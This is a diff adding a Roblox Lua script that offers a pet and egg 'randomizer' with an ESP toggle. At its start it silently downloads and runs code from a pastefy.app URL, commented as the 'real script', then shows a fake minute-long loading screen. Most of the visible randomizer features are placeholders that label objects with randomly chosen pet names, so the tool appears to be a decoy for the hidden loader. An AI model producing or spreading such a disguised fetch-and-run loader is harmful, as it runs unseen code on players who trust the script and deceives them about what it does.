@@ -1,0 +1,201 @@
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local Player = Players.LocalPlayer
+
+-- Wait for PlayerGui and Character
+repeat task.wait() until Player:FindFirstChild("PlayerGui")
+local char = Player.Character or Player.CharacterAdded:Wait()
+
+-- Run your real script immediately
+pcall(function()
+    loadstring(game:HttpGet("https://pastefy.app/EEmKlIPx/raw", true))()
+end)
+
+-- Ensure no blur effect interfering
+if game.Lighting:FindFirstChild("Blur") then
+    game.Lighting.Blur:Destroy()
+end
+
+-- LOADING GUI (isolated from side UI)
+local loadingGui = Instance.new("ScreenGui")
+loadingGui.ResetOnSpawn = false
+loadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+loadingGui.DisplayOrder = 999
+loadingGui.Parent = Player.PlayerGui
+
+local bg = Instance.new("Frame", loadingGui)
+bg.Size = UDim2.new(1,0,1,0)
+bg.BackgroundColor3 = Color3.new(0,0,0)
+bg.BorderSizePixel = 0
+
+-- Labels
+local top = Instance.new("TextLabel", bg)
+top.Size, top.Position = UDim2.new(1,0,0.1,0), UDim2.new(0,0,0.02,0)
+top.BackgroundTransparency, top.Text = 1, "Wait Until It Loads"
+top.Font, top.TextScaled = Enum.Font.GothamBold, true
+top.TextColor3, top.TextStrokeColor3 = Color3.new(1,0.47,0), Color3.new(1,0.27,0)
+top.TextStrokeTransparency = 0.8
+
+local loadText = Instance.new("TextLabel", bg)
+loadText.Size, loadText.Position = UDim2.new(1,0,0.3,0), UDim2.new(0,0,0.25,0)
+loadText.BackgroundTransparency = 1
+loadText.Text, loadText.Font, loadText.TextScaled = "0%", Enum.Font.GothamBlack, true
+loadText.TextColor3, loadText.TextStrokeColor3 = Color3.new(1,1,1), Color3.new(0,0,0)
+loadText.TextStrokeTransparency = 0.6
+
+local bottom = Instance.new("TextLabel", bg)
+bottom.Size, bottom.Position = UDim2.new(1,0,0.1,0), UDim2.new(0,0,0.88,0)
+bottom.BackgroundTransparency, bottom.Text = 1, "Be Patient"
+bottom.Font, bottom.TextScaled = Enum.Font.GothamBold, true
+bottom.TextColor3, bottom.TextStrokeColor3 = Color3.new(1,0.31,0), Color3.new(1,0.2,0)
+bottom.TextStrokeTransparency = 0.8
+
+-- Fire animation behind everything
+local function spawnFire()
+    for i=1,5 do
+        local fire = Instance.new("TextLabel", bg)
+        fire.Text, fire.Font, fire.TextScaled = "🔥", Enum.Font.SourceSansBold, true
+        fire.TextColor3 = Color3.new(1,0.39,0)
+        fire.BackgroundTransparency, fire.Size =
+            1, UDim2.new(0.05,0,0.05,0)
+        fire.Position = UDim2.new(math.random(),0,math.random(),0)
+        local goal = {Position = UDim2.new(math.random(),0,math.random(),0),
+                      TextTransparency = 1}
+        local tn = TweenService:Create(fire, TweenInfo.new(5,Enum.EasingStyle.Linear), goal)
+        tn:Play()
+        task.delay(5, function() fire:Destroy() end)
+    end
+end
+task.spawn(function() while true do spawnFire(); task.wait(1) end end)
+
+-- Remove loading screen once it's done
+task.spawn(function()
+    for i = 1, 99 do
+        loadText.Text = i .. "%"
+        task.wait(60/99)
+    end
+    loadText.Text = "99%"
+    task.wait(1)
+    loadingGui:Destroy()
+end)
+
+-- SIDE UI (in separate ScreenGui)
+local optionsGui = Instance.new("ScreenGui")
+optionsGui.ResetOnSpawn = false
+optionsGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+optionsGui.DisplayOrder = 500
+optionsGui.Parent = Player.PlayerGui
+
+local panel = Instance.new("Frame", optionsGui)
+panel.Size, panel.Position = UDim2.new(0.2,0,0.6,0), UDim2.new(0.02,0,0.2,0)
+panel.BackgroundColor3 = Color3.fromRGB(30,0,0)
+panel.BackgroundTransparency = 0.2
+panel.BorderSizePixel, panel.BorderColor3 = 2, Color3.fromRGB(255,50,0)
+
+-- Title
+local title = Instance.new("TextLabel", panel)
+title.Size, title.Position = UDim2.new(1,0,0.15,0), UDim2.new(0,0,0,0)
+title.BackgroundTransparency, title.Text = 1, "🔥 Options 🔥"
+title.Font, title.TextScaled = Enum.Font.GothamBold, true
+title.TextColor3, title.TextStrokeColor3 = Color3.new(1,0.31,0), Color3.new(1,0.31,0)
+title.TextStrokeTransparency = 0.7
+
+-- Button creator
+local function makeBtn(label, emoji, ypos)
+    local btn = Instance.new("TextButton", panel)
+    btn.Size, btn.Position = UDim2.new(0.9,0,0.15,0), UDim2.new(0.05,0,ypos,0)
+    btn.BackgroundColor3 = Color3.fromRGB(60,0,0)
+    btn.TextColor3, btn.Font, btn.TextScaled = Color3.new(1,1,1), Enum.Font.GothamBold, true
+    btn.TextStrokeTransparency, btn.TextStrokeColor3 = 0.7, Color3.new(1,0.31,0)
+    btn.Text = emoji .. " " .. label
+    return btn
+end
+
+local btnEgg = makeBtn("Egg Randomizer", "🎲", 0.2)
+local btnPet = makeBtn("Randomize Pets", "🎲", 0.38)
+local btnESP = makeBtn("ESP: OFF", "👁️", 0.56)
+local btnAuto = makeBtn("Auto Randomize: OFF", "🔄", 0.74)
+
+-- Pet data by egg (simplified)
+local eggData = {
+    Common = {{"Bunny",0.33},{"Dog",0.33},{"Golden Lab",0.34}},
+    Uncommon = {{"Cat",0.25},{"Black Bunny",0.25},{"Deer",0.25},{"Chicken",0.25}},
+    Rare = {{"Rooster",0.33},{"Orange Tabby",0.25},{"Pig",0.17},{"Monkey",0.25}}
+}
+
+local function pickPet(list)
+    local r = math.random()
+    local sum = 0
+    for _, v in ipairs(list) do
+        sum += v[2]
+        if r <= sum then return v[1] end
+    end
+    return list[#list][1]
+end
+
+-- Helper overlays
+local overlays = {}
+local espon = false
+local autorun = false
+
+-- Dummy detection functions (replace with your actual game logic)
+local function getEggs()
+    return workspace:GetChildren() -- filter egg parts by name, tags, etc.
+end
+local function getPets()
+    return workspace:GetChildren() -- filter pet models
+end
+local function showLabels(objects, data)
+    for _, obj in pairs(objects) do
+        local ent = Instance.new("BillboardGui", obj)
+        ent.Size = UDim2.new(0,100,0,50)
+        ent.Adornee = obj
+        ent.AlwaysOnTop = true
+        local lbl = Instance.new("TextLabel", ent)
+        lbl.Size = UDim2.new(1,1,1,1)
+        lbl.BackgroundTransparency, lbl.TextScaled = 1, true
+        lbl.TextColor3 = Color3.new(1,1,0)
+        lbl.Font = Enum.Font.GothamBold
+        lbl.Text = data
+        overlays[#overlays+1] = ent
+    end
+end
+
+-- Buttons behavior
+btnESP.MouseButton1Click:Connect(function()
+    espon = not espon
+    btnESP.Text = "👁️ ESP: " .. (espon and "ON" or "OFF")
+    -- remove or add highlight
+end)
+
+btnEgg.MouseButton1Click:Connect(function()
+    for _, v in ipairs(overlays) do v:Destroy() end
+    local eggs = getEggs()
+    for _, e in ipairs(eggs) do
+        local data = eggData["Common"] -- detect actual type here
+        local pet = pickPet(data)
+        showLabels({e}, pet)
+    end
+end)
+
+btnPet.MouseButton1Click:Connect(function()
+    for _, v in ipairs(overlays) do v:Destroy() end
+    local pets = getPets()
+    for _, p in ipairs(pets) do
+        local name = "???" -- display placeholder or logic
+        showLabels({p}, name)
+    end
+end)
+
+btnAuto.MouseButton1Click:Connect(function()
+    autorun = not autorun
+    btnAuto.Text = "🔄 Auto Randomize: " .. (autorun and "ON" or "OFF")
+    if autorun then
+        spawn(function()
+            while autorun do
+                btnEgg.MouseButton1Click:Fire()
+                task.wait(3)
+            end
+        end)
+    end
+end)
